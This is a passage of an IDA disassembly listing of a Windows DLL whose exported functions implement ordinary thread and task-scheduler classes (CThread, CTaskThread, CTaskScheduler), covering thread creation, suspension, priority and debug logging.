		mov	[ebp+var_10], esp
		push	0Ch		; Size
		mov	[ebp+var_14], eax
		xor	edi, edi
		lea	eax, [ebp+Dst]
		mov	esi, ecx
		push	edi		; Val
		push	eax		; Dst
		mov	[ebp+var_28], esi
		call	memset
		mov	eax, [ebp+arg_0]
		mov	[ebp+Dst], eax
		mov	eax, [ebp+arg_8]
		add	esp, 0Ch
		mov	[ebp+var_2C], eax
		mov	eax, [ebp+arg_4]
		push	edi
		mov	[ebp+var_30], eax
		push	0FFFFFFFFh
		lea	eax, [esi+14h]
		push	eax
		lea	ecx, [ebp+var_60]
		call	Ordinal1228
		mov	eax, [esi+4]
		cmp	eax, edi
		mov	[ebp+var_4], edi
		jz	short loc_6AF4F6F5
		cmp	[esi+10h], eax
		jb	short loc_6AF4F6F5
		push	offset aCtaskscheduler ; "CTaskScheduler::Add()	: m_TaskInfoList."...
		call	sub_6AF31006
		pop	ecx
		jmp	loc_6AF4F7D0
; ---------------------------------------------------------------------------

loc_6AF4F6F5:				; CODE XREF: Ordinal1362+5Aj
					; Ordinal1362+5Fj
		push	offset aCtaskschedul_0 ; "CTaskScheduler::Add()"
		lea	ecx, [ebp+var_54]
		call	Ordinal751
		lea	ecx, [esi+8]
		mov	eax, [ecx+4]
		lea	edx, [ebp+Dst]
		push	edx
		push	eax
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF4F5BD
		jmp	loc_6AF4F7B6
; ---------------------------------------------------------------------------

loc_6AF4F71B:				; DATA XREF: .rdata:6AF643FCo
		push	13h
		lea	ecx, [ebp+var_54]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_54]
		call	Ordinal762
		mov	ecx, [ebp+var_68]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_54]
		call	Ordinal764
		lea	ecx, [ebp+var_54]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4F7B3
		retn
; ---------------------------------------------------------------------------

loc_6AF4F75E:				; DATA XREF: .rdata:6AF6440Co
		push	15h
		lea	ecx, [ebp+var_54]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_54]
		call	Ordinal762
		mov	eax, [ebp+var_64]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_54]
		call	Ordinal764
		lea	ecx, [ebp+var_54]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4F7B3
		retn
; ---------------------------------------------------------------------------

loc_6AF4F7B3:				; DATA XREF: Ordinal1362+D4o
					; Ordinal1362+129o
		mov	esi, [ebp+var_28]

loc_6AF4F7B6:				; CODE XREF: Ordinal1362+92j
		xor	edi, edi
		inc	edi
		lea	ecx, [ebp+var_54]
		mov	[ebp+var_4], edi
		call	Ordinal753
		test	eax, eax
		lea	ecx, [ebp+var_54]
		jz	short loc_6AF4F7DC
		call	Ordinal752

loc_6AF4F7D0:				; CODE XREF: Ordinal1362+6Cj
		lea	ecx, [ebp+var_60]
		call	Ordinal1230
		xor	eax, eax
		jmp	short loc_6AF4F7F6
; ---------------------------------------------------------------------------

loc_6AF4F7DC:				; CODE XREF: Ordinal1362+145j
		call	Ordinal752
		or	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_60]
		call	Ordinal1230
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]
		mov	eax, edi

loc_6AF4F7F6:				; CODE XREF: Ordinal1362+156j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal1362	endp ; sp-analysis failed

; Exported entry 1366.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1366
Ordinal1366	proc near		; DATA XREF: .rdata:6AF604E0o
					; .rdata:6AF60550o ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	ebx, ecx
		xor	esi, esi
		push	esi
		push	0FFFFFFFFh
		lea	eax, [ebx+14h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		cmp	[ebx+10h], esi
		jz	short loc_6AF4F853
		mov	eax, [ebx+0Ch]
		mov	eax, [eax]
		push	edi
		mov	edi, [ebp+arg_0]
		lea	esi, [eax+8]
		movsd
		movsd
		movsd
		lea	ecx, [ebx+8]
		mov	eax, [ecx+4]
		push	dword ptr [eax]	; void *
		lea	eax, [ebp+arg_0]
		push	eax		; int
		call	sub_6AF4F5EC
		xor	esi, esi
		inc	esi
		pop	edi

loc_6AF4F853:				; CODE XREF: Ordinal1366+1Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1366	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4F863(void *, char)
sub_6AF4F863	proc near		; DATA XREF: .rdata:off_6AF604D4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1361
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4F879
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4F879:				; CODE XREF: sub_6AF4F863+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4F863	endp

; Exported entry 1368.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1368
Ordinal1368	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal1381
		lea	edi, [esi+38h]
		mov	ecx, edi
		call	Ordinal1360
		lea	ecx, [esi+6Ch]
		mov	dword ptr [esi], offset	off_6AF60558
		mov	dword ptr [edi], offset	off_6AF60544
		call	Ordinal1313
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal1368	endp

; Exported entry 1369.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1369
Ordinal1369	proc near		; CODE XREF: sub_6AF4F9C9+Bp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+38h]
		lea	ecx, [esi+6Ch]
		mov	dword ptr [esi], offset	off_6AF60558
		mov	dword ptr [edi], offset	off_6AF60544
		call	Ordinal1315
		mov	ecx, edi
		call	Ordinal1361
		pop	edi
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1382
Ordinal1369	endp

; Exported entry 1370.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal1370(LPVOID lpParameter, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, int)
		public Ordinal1370
Ordinal1370	proc near		; DATA XREF: .rdata:off_6AF66098o

lpThreadAttributes= dword ptr  4
dwStackSize	= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+6Ch]
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4F907
		push	eax		; int
		push	eax		; lpString2
		push	eax		; bInitialState
		push	eax		; bManualReset
		push	eax		; lpEventAttributes
		mov	ecx, esi
		call	Ordinal1317
		test	eax, eax
		jnz	short loc_6AF4F907
		push	offset aCtaskthreadCre ; "CTaskThread::Create()	: m_AddEvent.Crea"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4F921
; ---------------------------------------------------------------------------

loc_6AF4F907:				; CODE XREF: Ordinal1370+10j
					; Ordinal1370+20j
		mov	ecx, esi
		call	Ordinal1324
		push	[esp+8+arg_8]	; int
		mov	ecx, edi	; lpParameter
		push	[esp+0Ch+dwStackSize] ;	dwStackSize
		push	[esp+10h+lpThreadAttributes] ; lpThreadAttributes
		call	Ordinal1383

loc_6AF4F921:				; CODE XREF: Ordinal1370+2Fj
		pop	edi
		pop	esi
		retn	0Ch
Ordinal1370	endp

; Exported entry 1371.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1371
Ordinal1371	proc near		; DATA XREF: .rdata:6AF60548o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi-38h]
		mov	ecx, esi
		call	Ordinal1394
		test	eax, eax
		jz	short loc_6AF4F958
		mov	ecx, esi
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF4F958
		push	[esp+8+arg_8]
		mov	ecx, edi
		push	[esp+0Ch+arg_4]
		push	[esp+10h+arg_0]
		call	Ordinal1362
		jmp	short loc_6AF4F95A
; ---------------------------------------------------------------------------

loc_6AF4F958:				; CODE XREF: Ordinal1371+10j
					; Ordinal1371+1Bj
		xor	eax, eax

loc_6AF4F95A:				; CODE XREF: Ordinal1371+30j
		pop	edi
		pop	esi
		retn	0Ch
Ordinal1371	endp

; Exported entry 1372.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1372
Ordinal1372	proc near		; DATA XREF: .rdata:6AF6054Co
					; .rdata:off_6AF66098o
		add	ecx, 34h
		jmp	Ordinal1322
Ordinal1372	endp

; Exported entry 1374.
; Exported entry 1405.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1374
Ordinal1374	proc near		; DATA XREF: .rdata:6AF60568o
					; .rdata:6AF60818o ...
		push	offset aCworkerthreadI ; ccL30_1374
		call	sub_6AF31006
		xor	eax, eax
		pop	ecx
		inc	eax
		retn
Ordinal1374	endp

; Exported entry 1375.
; Exported entry 1406.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1375
Ordinal1375	proc near		; DATA XREF: .rdata:6AF6056Co
					; .rdata:6AF6081Co ...
		push	offset aCworkerthreadE ; ccL30_1375
		call	sub_6AF31006
		pop	ecx
		retn
Ordinal1375	endp

; Exported entry 1376.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1376
Ordinal1376	proc near		; CODE XREF: Ordinal1373+16p
					; Ordinal1373+65p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	edi, ecx
		lea	ecx, [ebp+var_C]
		lea	esi, [edi+38h]
		mov	eax, [esi]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jz	short loc_6AF4F9C5
		add	edi, 4
		push	ebx

loc_6AF4F9A2:				; CODE XREF: Ordinal1376+40j
		mov	ebx, [esi]
		lea	eax, [ebp+var_C]
		push	eax
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+0Ch]
		push	eax
		mov	ecx, esi
		call	dword ptr [ebx+10h]
		mov	eax, [esi]
		lea	ecx, [ebp+var_C]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jnz	short loc_6AF4F9A2
		pop	ebx

loc_6AF4F9C5:				; CODE XREF: Ordinal1376+1Aj
		pop	edi
		pop	esi
		leave
		retn
Ordinal1376	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4F9C9	proc near		; DATA XREF: .rdata:off_6AF60544o

arg_0		= byte ptr  4

		sub	ecx, 38h
		jmp	$+5

loc_6AF4F9D1:				; DATA XREF: .rdata:off_6AF60558o
		push	esi
		mov	esi, ecx
		call	Ordinal1369
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4F9E7
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4F9E7:				; CODE XREF: sub_6AF4F9C9+15j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4F9C9	endp

; Exported entry 1373.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1373
Ordinal1373	proc near		; DATA XREF: .rdata:6AF60564o
					; .rdata:off_6AF66098o

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		push	offset aCtaskthreadRun ; "CTaskThread::Run()\n"
		mov	esi, ecx
		call	sub_6AF31006
		pop	ecx
		mov	ecx, esi
		call	Ordinal1376
		lea	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		lea	ecx, [esi+6Ch]
		mov	[ebp+var_8], eax
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		push	0
		push	dword ptr [esi+2Ch]
		lea	ecx, [ebp+var_14]
		mov	[ebp+var_4], eax
		call	Ordinal1267

loc_6AF4FA2B:				; CODE XREF: Ordinal1373+6Aj
		mov	ecx, esi
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF4FA59
		push	eax
		push	0FFFFFFFFh
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	2
		lea	ecx, [ebp+var_14]
		call	Ordinal1269
		sub	eax, 0
		jz	short loc_6AF4FA59
		dec	eax
		jnz	short loc_6AF4FA59
		mov	ecx, esi
		call	Ordinal1376
		jmp	short loc_6AF4FA2B
; ---------------------------------------------------------------------------

loc_6AF4FA59:				; CODE XREF: Ordinal1373+47j
					; Ordinal1373+5Ej ...
		mov	ecx, esi
		call	Ordinal1376
		lea	ecx, [ebp+var_14]
		call	Ordinal1268
		xor	eax, eax
		pop	esi
		leave
		retn
Ordinal1373	endp

; Exported entry 1377.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1377
Ordinal1377	proc near		; CODE XREF: Ordinal1381+2Ap
					; Ordinal1408+34p
					; DATA XREF: ...
		mov	eax, ecx
		xor	ecx, ecx
		mov	dword ptr [eax], offset	off_6AF605FC
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		mov	dword ptr [eax+10h], 3
		mov	[eax+14h], ecx
		retn
Ordinal1377	endp

; Exported entry 1379.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1379
Ordinal1379	proc near		; CODE XREF: Ordinal1409+1Bp
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF605FC
		retn
Ordinal1379	endp

; Exported entry 1380.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1380
Ordinal1380	proc near		; CODE XREF: Ordinal1378+22p
					; Ordinal1418+145p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		cmp	eax, ecx
		jz	short locret_6AF4FABA
		mov	edx, [ecx+4]
		mov	[eax+4], edx
		mov	edx, [ecx+8]
		mov	[eax+8], edx
		mov	edx, [ecx+0Ch]
		mov	[eax+0Ch], edx
		mov	edx, [ecx+10h]
		mov	[eax+10h], edx
		mov	ecx, [ecx+14h]
		mov	[eax+14h], ecx

locret_6AF4FABA:			; CODE XREF: Ordinal1380+8j
		retn	4
Ordinal1380	endp

; Exported entry 1381.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1381
Ordinal1381	proc near		; CODE XREF: Ordinal477+3p
					; Ordinal852+3p ...
		push	esi
		mov	esi, ecx
		push	0
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF60600
		call	Ordinal1220
		lea	ecx, [esi+0Ch]
		call	Ordinal1313
		and	dword ptr [esi+14h], 0
		and	dword ptr [esi+18h], 0
		and	dword ptr [esi+1Ch], 0
		lea	ecx, [esi+20h]
		call	Ordinal1377
		mov	eax, esi
		pop	esi
		retn
Ordinal1381	endp

; Exported entry 1384.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1384
Ordinal1384	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	dword ptr [ecx+18h] ; hThread
		call	ds:SuspendThread
		retn
Ordinal1384	endp

; Exported entry 1385.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1385
Ordinal1385	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	dword ptr [ecx+18h] ; hThread
		call	ds:ResumeThread
		retn
Ordinal1385	endp

; Exported entry 1387.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1387
Ordinal1387	proc near		; CODE XREF: Ordinal1059+33p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, ecx
		push	dword ptr [eax+2Ch]
		lea	ecx, [eax+4]
		push	[esp+4+arg_0]
		mov	edx, [ecx]
		call	dword ptr [edx+4]
		retn	4
Ordinal1387	endp

; Exported entry 1389.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1389
Ordinal1389	proc near		; CODE XREF: Ordinal855+2Ej
					; DATA XREF: .rdata:6AF59528o ...
		push	esi
		push	edi
		mov	edi, ds:ResumeThread
		mov	esi, ecx
		jmp	short loc_6AF4FB28
; ---------------------------------------------------------------------------

loc_6AF4FB24:				; CODE XREF: Ordinal1389+18j
		test	eax, eax
		jz	short loc_6AF4FB32

loc_6AF4FB28:				; CODE XREF: Ordinal1389+Aj
		push	dword ptr [esi+18h] ; hThread
		call	edi ; ResumeThread
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4FB24

loc_6AF4FB32:				; CODE XREF: Ordinal1389+Ej
		push	1
		lea	ecx, [esi+4]
		call	Ordinal1223
		pop	edi
		pop	esi
		retn
Ordinal1389	endp

; Exported entry 1392.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1392(int	nPriority)
		public Ordinal1392
Ordinal1392	proc near		; DATA XREF: .rdata:off_6AF66098o

nPriority	= dword	ptr  4

		push	[esp+nPriority]	; nPriority
		push	dword ptr [ecx+18h] ; hThread
		call	ds:SetThreadPriority
		retn	4
Ordinal1392	endp

; Exported entry 1393.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1393
Ordinal1393	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	dword ptr [ecx+18h] ; hThread
		call	ds:GetThreadPriority
		retn
Ordinal1393	endp

; Exported entry 1394.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1394
Ordinal1394	proc near		; CODE XREF: Ordinal1371+9p
					; Ordinal1383+7p ...
		mov	eax, [ecx+18h]
		test	eax, eax
		jnz	short loc_6AF4FB61
		retn
; ---------------------------------------------------------------------------

loc_6AF4FB61:				; CODE XREF: Ordinal1394+5j
		push	0		; dwMilliseconds
		push	eax		; hHandle
		call	ds:WaitForSingleObject
		sub	eax, 102h
		neg	eax
		sbb	eax, eax
		inc	eax
		retn
Ordinal1394	endp

; Exported entry 1395.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1395
Ordinal1395	proc near		; CODE XREF: Ordinal499+34p
					; Ordinal1371+14p ...
		add	ecx, 4
		jmp	Ordinal1224
Ordinal1395	endp

; Exported entry 1396.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1396
Ordinal1396	proc near		; CODE XREF: Ordinal1418+13Ep
					; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+20h]
		retn
Ordinal1396	endp

; Exported entry 1397.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1397
Ordinal1397	proc near		; DATA XREF: .rdata:6AF60610o
					; .rdata:off_6AF66098o
		push	offset aCthreadInitins ; "CThread::InitInstance()\n"
		call	sub_6AF31006
		xor	eax, eax
		pop	ecx
		inc	eax
		retn
Ordinal1397	endp

; Exported entry 1398.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1398
Ordinal1398	proc near		; DATA XREF: .rdata:6AF60614o
					; .rdata:off_6AF66098o
		push	offset aCthreadExitins ; "CThread::ExitInstance()\n"
		call	sub_6AF31006
		pop	ecx
		retn
Ordinal1398	endp

; Exported entry 1399.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1399
Ordinal1399	proc near		; CODE XREF: sub_6AF4FC2C+8p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	eax, [esi+30h]
		cmp	eax, 3
		jz	short loc_6AF4FBD6
		push	eax
		call	Ordinal446
		test	eax, eax
		pop	ecx
		jge	short loc_6AF4FBD6
		push	eax		; Args
		push	offset aCthreadStartCc ; "CThread::Start() : CCoInitialize::CoIni"...
		call	sub_6AF3102E
		and	dword ptr [esi+14h], 0
		cmp	dword ptr [esi+34h], 0
		pop	ecx
		pop	ecx
		jz	short loc_6AF4FBD1
		lea	ecx, [esi+0Ch]
		call	Ordinal1322

loc_6AF4FBD1:				; CODE XREF: Ordinal1399+2Bj
		or	eax, 0FFFFFFFFh
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF4FBD6:				; CODE XREF: Ordinal1399+9j
					; Ordinal1399+14j
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+10h]
		cmp	dword ptr [esi+34h], 0
		mov	[esi+14h], eax
		jz	short loc_6AF4FBEE
		lea	ecx, [esi+0Ch]
		call	Ordinal1322

loc_6AF4FBEE:				; CODE XREF: Ordinal1399+48j
		push	ebx		; Args
		or	ebx, 0FFFFFFFFh
		cmp	dword ptr [esi+14h], 0
		jnz	short loc_6AF4FC0C
		push	offset aCthreadStartIn ; "CThread::Start() : InitInstance() == FA"...
		call	sub_6AF3101A
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+8]
		jmp	short loc_6AF4FC15
; ---------------------------------------------------------------------------

loc_6AF4FC0C:				; CODE XREF: Ordinal1399+5Aj
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		mov	ebx, eax

loc_6AF4FC15:				; CODE XREF: Ordinal1399+6Ej
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+14h]
		cmp	dword ptr [esi+30h], 3
		jz	short loc_6AF4FC27
		call	Ordinal447

loc_6AF4FC27:				; CODE XREF: Ordinal1399+84j
		mov	eax, ebx
		pop	ebx
		pop	esi
		retn
Ordinal1399	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4FC2C	proc near		; CODE XREF: .text:6AF4FC53p
					; StartAddress+4p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		push	edi
		mov	ecx, esi
		call	Ordinal1399
		cmp	dword ptr [esi+24h], 0
		mov	edi, eax
		jz	short loc_6AF4FC49
		mov	eax, [esi]
		push	1
		mov	ecx, esi
		call	dword ptr [eax]

loc_6AF4FC49:				; CODE XREF: sub_6AF4FC2C+13j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_6AF4FC2C	endp

; ---------------------------------------------------------------------------

loc_6AF4FC4E:				; DATA XREF: Ordinal1383+C3o
		push	esi
		push	dword ptr [esp+8]
		call	sub_6AF4FC2C
		mov	esi, eax
		push	esi
		call	ds:_endthreadex
		pop	ecx
		pop	ecx
		mov	eax, esi
		pop	esi
		retn	4

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: Ordinal1383+91o

arg_0		= dword	ptr  4

		push	[esp+arg_0]
		call	sub_6AF4FC2C
		pop	ecx
		push	eax		; dwExitCode
		call	ds:ExitThread
StartAddress	endp

; ---------------------------------------------------------------------------
		db 0CCh
; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_13. PRESS	KEYPAD "+" TO EXPAND]
; Exported entry 1378.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1378
Ordinal1378	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		xor	eax, eax
		mov	dword ptr [esi], offset	off_6AF605FC
		mov	[esi+4], eax
		mov	[esi+8], eax
		mov	[esi+0Ch], eax
		mov	dword ptr [esi+10h], 3
		mov	[esi+14h], eax
		call	Ordinal1380
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1378	endp

; Exported entry 1383.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall Ordinal1383(LPVOID lpParameter, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, int)
		public Ordinal1383
Ordinal1383	proc near		; CODE XREF: Ordinal480+164p
					; Ordinal854+13Cp ...

var_4		= dword	ptr -4
lpThreadAttributes= dword ptr  8
dwStackSize	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		call	Ordinal1394
		test	eax, eax
		jz	short loc_6AF4FCE7
		push	offset aCthreadCreateI ; "CThread::Create() : IsThread() != FALSE"...
		call	sub_6AF3101A
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF4FE0A
; ---------------------------------------------------------------------------

loc_6AF4FCE7:				; CODE XREF: Ordinal1383+Ej
		mov	eax, [esi+18h]
		push	edi
		xor	edi, edi
		cmp	eax, edi
		jz	short loc_6AF4FCFB
		push	eax		; hObject
		call	ds:CloseHandle
		mov	[esi+18h], edi

loc_6AF4FCFB:				; CODE XREF: Ordinal1383+2Aj
		push	ebx		; Args
		push	edi
		lea	ecx, [esi+4]
		call	Ordinal1223
		cmp	[esi+34h], edi
		mov	[esi+14h], edi
		jz	short loc_6AF4FD45
		lea	ebx, [esi+0Ch]
		mov	ecx, ebx
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4FD3E
		push	edi		; int
		push	edi		; lpString2
		push	edi		; bInitialState
		push	1		; bManualReset
		push	edi		; lpEventAttributes
		mov	ecx, ebx
		call	Ordinal1317
		test	eax, eax
		jnz	short loc_6AF4FD3E
		push	offset aCthreadCreateM ; "CThread::Create() : m_InitInstanceEvent"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4FD37:				; CODE XREF: Ordinal1383+FFj
		xor	eax, eax
		jmp	loc_6AF4FE08
; ---------------------------------------------------------------------------

loc_6AF4FD3E:				; CODE XREF: Ordinal1383+54j
					; Ordinal1383+65j
		mov	ecx, ebx
		call	Ordinal1324

loc_6AF4FD45:				; CODE XREF: Ordinal1383+46j
		cmp	[esi+28h], edi
		jz	short loc_6AF4FD7C
		lea	eax, [esi+1Ch]
		push	eax		; lpThreadId
		mov	eax, [ebp+arg_8]
		or	eax, 4
		push	eax		; dwCreationFlags
		push	esi		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	[ebp+dwStackSize] ; dwStackSize
		push	[ebp+lpThreadAttributes] ; lpThreadAttributes
		call	ds:CreateThread
		cmp	eax, edi
		mov	[esi+18h], eax
		jnz	short loc_6AF4FDBF
		call	ds:GetLastError
		push	eax
		push	offset aCthreadCreateC ; "CThread::Create() : CreateThread() ==	N"...
		jmp	short loc_6AF4FDB8
; ---------------------------------------------------------------------------

loc_6AF4FD7C:				; CODE XREF: Ordinal1383+83j
		lea	eax, [ebp+var_4]
		push	eax
		mov	eax, [ebp+arg_8]
		or	eax, 4
		push	eax
		push	esi
		push	offset loc_6AF4FC4E
		push	[ebp+dwStackSize]
		mov	[ebp+var_4], edi
		push	[ebp+lpThreadAttributes]
		call	ds:_beginthreadex
		mov	ecx, [ebp+var_4]
		add	esp, 18h
		cmp	eax, edi
		mov	[esi+18h], eax
		mov	[esi+1Ch], ecx
		jnz	short loc_6AF4FDBF
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCthreadCreate_ ; "CThread::Create() : _beginthreadex() =="...

loc_6AF4FDB8:				; CODE XREF: Ordinal1383+B5j
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4FDBF:				; CODE XREF: Ordinal1383+A7j
					; Ordinal1383+E5j
		mov	eax, [esi+18h]
		cmp	eax, edi
		jz	loc_6AF4FD37
		xor	ebx, ebx
		inc	ebx
		test	byte ptr [ebp+arg_8], 4
		jnz	short loc_6AF4FDFE
		push	eax		; hThread
		call	ds:ResumeThread
		cmp	[esi+34h], edi
		jz	short loc_6AF4FDFE
		push	dword ptr [esi+2Ch]
		lea	ecx, [esi+0Ch]
		mov	eax, [ecx]
		push	0FFFFFFFFh
		call	dword ptr [eax+4]
		mov	ebx, [esi+14h]
		cmp	ebx, edi
		jnz	short loc_6AF4FDFE
		push	offset aCthreadCreat_0 ; "CThread::Create() : m_bInitInstanceResu"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4FDFE:				; CODE XREF: Ordinal1383+10Cj
					; Ordinal1383+118j ...
		lea	ecx, [esi+0Ch]
		call	Ordinal1296
		mov	eax, ebx

loc_6AF4FE08:				; CODE XREF: Ordinal1383+74j
		pop	ebx
		pop	edi

loc_6AF4FE0A:				; CODE XREF: Ordinal1383+1Dj
		pop	esi
		leave
		retn	0Ch
Ordinal1383	endp

; Exported entry 1386.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1386(DWORD dwMilliseconds)
		public Ordinal1386
Ordinal1386	proc near		; CODE XREF: Ordinal1388+49p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
dwMilliseconds	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		call	Ordinal1394
		test	eax, eax
		jnz	short loc_6AF4FE24
		inc	eax
		jmp	short loc_6AF4FE50
; ---------------------------------------------------------------------------

loc_6AF4FE24:				; CODE XREF: Ordinal1386+10j
		push	0
		push	dword ptr [esi+2Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1267
